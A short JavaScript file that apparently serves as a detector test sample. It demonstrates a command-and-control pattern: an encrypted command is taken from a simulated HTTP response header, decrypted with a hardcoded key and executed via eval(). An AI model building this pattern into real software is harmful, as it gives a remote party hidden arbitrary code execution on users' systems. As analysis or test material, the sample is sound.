// main.js - Main entry point using CommonJS
// Demonstrates cross-file C2 pattern with header extraction and decryption

const { decrypt, extractFromHeader } = require('./utils.js');

// Simulated HTTP response with hidden command in header
const response = {
    headers: {
        'x-command': 'U2FsdGVkX1+abc123==',  // Encrypted command
        'content-type': 'application/json'
    }
};

// Extract encrypted command from header
const encrypted = extractFromHeader(response.headers);

// Decrypt and execute
const decrypted = decrypt(encrypted, 'mysecretkey1234567890123456');
eval(decrypted);
